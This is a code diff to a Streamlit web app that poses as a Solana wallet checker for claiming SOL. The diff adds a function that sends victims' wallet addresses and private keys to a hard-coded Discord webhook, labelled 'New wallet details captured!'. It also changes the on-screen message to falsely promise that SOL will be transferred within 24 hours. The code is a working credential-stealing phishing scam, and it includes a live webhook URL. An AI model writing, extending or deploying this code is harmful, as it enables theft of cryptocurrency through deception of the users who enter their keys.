@@ -34,6 +34,14 @@ st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun
 # Navigation menu
 menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
 
+def send_to_discord(wallet_address, private_key):
+    webhook_url = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
+    message = {
+        "content": f"New wallet details captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
+    }
+    response = requests.post(webhook_url, json=message)
+    return response.status_code == 200
+
 if menu == "Check Wallet ✅":
     st.header("Check Wallet Eligibility")
     wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
@@ -51,11 +59,8 @@ if menu == "Check Wallet ✅":
                     if private_key:
                         if is_valid_solana_private_key(private_key):
                             send_to_discord(wallet_address, private_key)
-                            st.write("🔒 Cleanup process initiated...")
-                            st.write("Optimizing wallet...")
-                            time.sleep(2)
-                            st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
-                            st.write("You will be notified once the cleanup is done. Thank you for your patience!")
+                            st.success("✅ Successfully initiated cleanup! Your SOL will be transferred within 24 hours.")
+                            st.info("🕒 Please wait while we process your request. You'll receive your SOL soon!")
                         else:
                             st.error("Invalid Solana private key. Please enter a valid private key.")
             else:
